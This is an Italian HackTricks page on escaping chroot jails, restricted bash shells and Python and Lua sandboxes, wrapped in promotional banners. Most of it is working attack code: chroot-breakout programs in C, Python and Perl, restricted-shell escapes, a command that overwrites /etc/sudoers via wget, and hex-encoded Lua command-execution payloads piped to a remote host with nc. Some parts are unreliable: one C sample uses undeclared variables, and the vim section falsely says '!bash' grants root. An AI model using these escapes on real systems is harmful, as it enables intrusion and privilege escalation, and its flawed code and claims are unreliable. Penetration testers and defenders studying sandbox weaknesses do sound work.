# Fuga dalle prigioni

<details>

<summary><strong>Impara l'hacking di AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata in HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PACCHETTI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di esclusive [**NFT**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR a** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## **GTFOBins**

**Cerca in** [**https://gtfobins.github.io/**](https://gtfobins.github.io) **se puoi eseguire un binario con la proprietà "Shell"**

## Fughe di Chroot

Da [wikipedia](https://en.wikipedia.org/wiki/Chroot#Limitations): Il meccanismo chroot **non è inteso a difendersi** da manomissioni intenzionali da parte di utenti **privilegiati** (**root**). Sui sistemi più comuni, i contesti chroot non si impilano correttamente e i programmi chrooted **con privilegi sufficienti possono eseguire un secondo chroot per evadere**.\
Di solito ciò significa che per evadere è necessario essere root all'interno del chroot.

{% hint style="success" %}
Lo **strumento** [**chw00t**](https://github.com/earthquake/chw00t) è stato creato per sfruttare gli scenari seguenti e sfuggire a `chroot`.
{% endhint %}

### Root + CWD

{% hint style="warning" %}
Se sei **root** all'interno di un chroot **puoi evadere** creando **un altro chroot**. Questo perché due chroot non possono coesistere (in Linux), quindi se crei una cartella e poi **crei un nuovo chroot** in quella nuova cartella essendo **fuori da essa**, sarai ora **fuori dal nuovo chroot** e quindi sarai nel FS.

Ciò accade perché di solito chroot NON sposta la tua directory di lavoro in quella indicata, quindi puoi creare un chroot ma essere fuori da esso.
{% endhint %}

Di solito non troverai il binario `chroot` all'interno di una prigione chroot, ma **potresti compilare, caricare ed eseguire** un binario:

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("chroot-dir", 0755);
chroot("chroot-dir");
for(int i = 0; i < 1000; i++) {
chdir("..");
}
chroot(".");
system("/bin/bash");
}
```
</details>

<details>

<summary>Python</summary>
```python
#!/usr/bin/python
import os
os.mkdir("chroot-dir")
os.chroot("chroot-dir")
for i in range(1000):
os.chdir("..")
os.chroot(".")
os.system("/bin/bash")
```
</details>

<details>

<summary>Perl</summary>
```perl
#!/usr/bin/perl
mkdir "chroot-dir";
chroot "chroot-dir";
foreach my $i (0..1000) {
chdir ".."
}
chroot ".";
system("/bin/bash");
```
</details>

### Root + FD Salvato

{% hint style="warning" %}
Questo è simile al caso precedente, ma in questo caso l'**attaccante memorizza un file descriptor nella directory corrente** e quindi **crea il chroot in una nuova cartella**. Infine, poiché ha **accesso** a quel **FD all'esterno** del chroot, vi accede e **scappa**.
{% endhint %}

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("tmpdir", 0755);
dir_fd = open(".", O_RDONLY);
if(chroot("tmpdir")){
perror("chroot");
}
fchdir(dir_fd);
close(dir_fd);
for(x = 0; x < 1000; x++) chdir("..");
chroot(".");
}
```
</details>

### Root + Fork + UDS (Unix Domain Sockets)

{% hint style="warning" %}
I file descriptor possono essere passati tramite Unix Domain Sockets, quindi:

* Crea un processo figlio (fork)
* Crea un UDS in modo che il processo padre e il processo figlio possano comunicare
* Esegui chroot nel processo figlio in una cartella diversa
* Nel processo padre, crea un file descriptor di una cartella che si trova al di fuori del chroot del nuovo processo figlio
* Passa al processo figlio quel file descriptor utilizzando l'UDS
* Il processo figlio cambia la directory corrente a quella del file descriptor e, poiché si trova al di fuori del suo chroot, riesce a evadere la prigione
{% endhint %}

### Root + Mount

{% hint style="warning" %}
* Monta il dispositivo root (/) in una directory all'interno del chroot
* Esegui chroot in quella directory

Questo è possibile in Linux
{% endhint %}

### Root + /proc

{% hint style="warning" %}
* Monta procfs in una directory all'interno del chroot (se non è già montato)
* Cerca un pid che abbia una voce root/cwd diversa, ad esempio: /proc/1/root
* Esegui chroot in quella voce
{% endhint %}

### Root(?) + Fork

{% hint style="warning" %}
* Crea un fork (processo figlio) ed esegui chroot in una cartella diversa più profonda nel file system e cambia la directory corrente in essa
* Dal processo padre, sposta la cartella in cui si trova il processo figlio in una cartella precedente al chroot dei figli
* Questo processo figlio si troverà al di fuori del chroot
{% endhint %}

### ptrace

{% hint style="warning" %}
* Tempo fa gli utenti potevano eseguire il debug dei propri processi da un processo stesso... ma questo non è più possibile per impostazione predefinita
* Tuttavia, se è possibile, è possibile eseguire il ptrace su un processo ed eseguire un shellcode al suo interno ([vedi questo esempio](linux-capabilities.md#cap\_sys\_ptrace)).
{% endhint %}

## Bash Jails

### Enumerazione

Ottieni informazioni sulla prigione:
```bash
echo $SHELL
echo $PATH
env
export
pwd
```
### Modifica del PATH

Verifica se puoi modificare la variabile di ambiente PATH.
```bash
echo $PATH #See the path of the executables that you can use
PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin #Try to change the path
echo /home/* #List directory
```
### Utilizzo di vim

Vim è un potente editor di testo che può essere utilizzato per eseguire l'escalation dei privilegi in un sistema Linux limitato. Segui i passaggi seguenti per utilizzare vim per ottenere privilegi più elevati:

1. Apri una shell limitata utilizzando il comando `bash -r`.
2. Digita `vim` per avviare l'editor di testo vim.
3. Premi `:` per passare alla modalità di comando.
4. Digita `!` seguito da un comando che ti consentirà di ottenere privilegi più elevati. Ad esempio, puoi utilizzare `!bash` per aprire una nuova shell con privilegi di root.
5. Premi `Enter` per eseguire il comando e ottenere privilegi più elevati.
6. Ora sei in grado di eseguire comandi con privilegi di root utilizzando la nuova shell aperta da vim.

Ricorda che l'utilizzo di vim per l'escalation dei privilegi richiede una shell limitata e l'accesso a vim stesso.
```bash
:set shell=/bin/sh
:shell
```
### Crea script

Verifica se puoi creare un file eseguibile con _/bin/bash_ come contenuto
```bash
red /bin/bash
> w wx/path #Write /bin/bash in a writable and executable path
```
### Ottenere bash da SSH

Se stai accedendo tramite ssh, puoi utilizzare questo trucco per eseguire una shell bash:
```bash
ssh -t user@<IP> bash # Get directly an interactive shell
ssh user@<IP> -t "bash --noprofile -i"
ssh user@<IP> -t "() { :; }; sh -i "
```
### Dichiarazione

La dichiarazione è un comando utilizzato per assegnare un valore a una variabile in Bash. Viene utilizzato il seguente formato:

```bash
variabile=valore
```

Dove "variabile" è il nome della variabile e "valore" è il valore che si desidera assegnare ad essa.
```bash
declare -n PATH; export PATH=/bin;bash -i

BASH_CMDS[shell]=/bin/bash;shell -i
```
### Wget

È possibile sovrascrivere ad esempio il file sudoers.
```bash
wget http://127.0.0.1:8080/sudoers -O /etc/sudoers
```
### Altri trucchi

[**https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/**](https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/)\
[https://pen-testing.sans.org/blog/2012/0**b**6/06/escaping-restricted-linux-shells](https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells\*\*]\(https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells)\
[https://gtfobins.github.io](https://gtfobins.github.io/\*\*]\(https/gtfobins.github.io)\
**Potrebbe essere interessante anche la pagina:**

{% content-ref url="../useful-linux-commands/bypass-bash-restrictions.md" %}
[bypass-bash-restrictions.md](../useful-linux-commands/bypass-bash-restrictions.md)
{% endcontent-ref %}

## Python Jails

Trucchi per sfuggire alle prigioni di Python nella seguente pagina:

{% content-ref url="../../generic-methodologies-and-resources/python/bypass-python-sandboxes/" %}
[bypass-python-sandboxes](../../generic-methodologies-and-resources/python/bypass-python-sandboxes/)
{% endcontent-ref %}

## Lua Jails

In questa pagina puoi trovare le funzioni globali a cui hai accesso all'interno di Lua: [https://www.gammon.com.au/scripts/doc.php?general=lua\_base](https://www.gammon.com.au/scripts/doc.php?general=lua\_base)

**Eval con esecuzione di comandi:**
```bash
load(string.char(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))()
```
Alcuni trucchi per **chiamare le funzioni di una libreria senza utilizzare i punti**:
```bash
print(string.char(0x41, 0x42))
print(rawget(string, "char")(0x41, 0x42))
```
Enumerare le funzioni di una libreria:
```bash
for k,v in pairs(string) do print(k,v) end
```
Nota che ogni volta che esegui il precedente one-liner in un **diverso ambiente lua, l'ordine delle funzioni cambia**. Pertanto, se hai bisogno di eseguire una specifica funzione, puoi effettuare un attacco di forza bruta caricando diversi ambienti lua e chiamando la prima funzione della libreria "le".
```bash
#In this scenario you could BF the victim that is generating a new lua environment
#for every interaction with the following line and when you are lucky
#the char function is going to be executed
for k,chr in pairs(string) do print(chr(0x6f,0x73,0x2e,0x65,0x78)) end

#This attack from a CTF can be used to try to chain the function execute from "os" library
#and "char" from string library, and the use both to execute a command
for i in seq 1000; do echo "for k1,chr in pairs(string) do for k2,exec in pairs(os) do print(k1,k2) print(exec(chr(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))) break end break end" | nc 10.10.10.10 10006 | grep -A5 "Code: char"; done
```
**Ottieni una shell interattiva di Lua**: Se ti trovi all'interno di una shell di Lua limitata, puoi ottenere una nuova shell di Lua (e sperabilmente illimitata) chiamando:
```bash
debug.debug()
```
## Riferimenti

* [https://www.youtube.com/watch?v=UO618TeyCWo](https://www.youtube.com/watch?v=UO618TeyCWo) (Slides: [https://deepsec.net/docs/Slides/2015/Chw00t\_How\_To\_Break%20Out\_from\_Various\_Chroot\_Solutions\_-\_Bucsay\_Balazs.pdf](https://deepsec.net/docs/Slides/2015/Chw00t\_How\_To\_Break%20Out\_from\_Various\_Chroot\_Solutions\_-\_Bucsay\_Balazs.pdf))

<details>

<summary><strong>Impara l'hacking di AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata in HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di esclusive [**NFT**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR ai** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
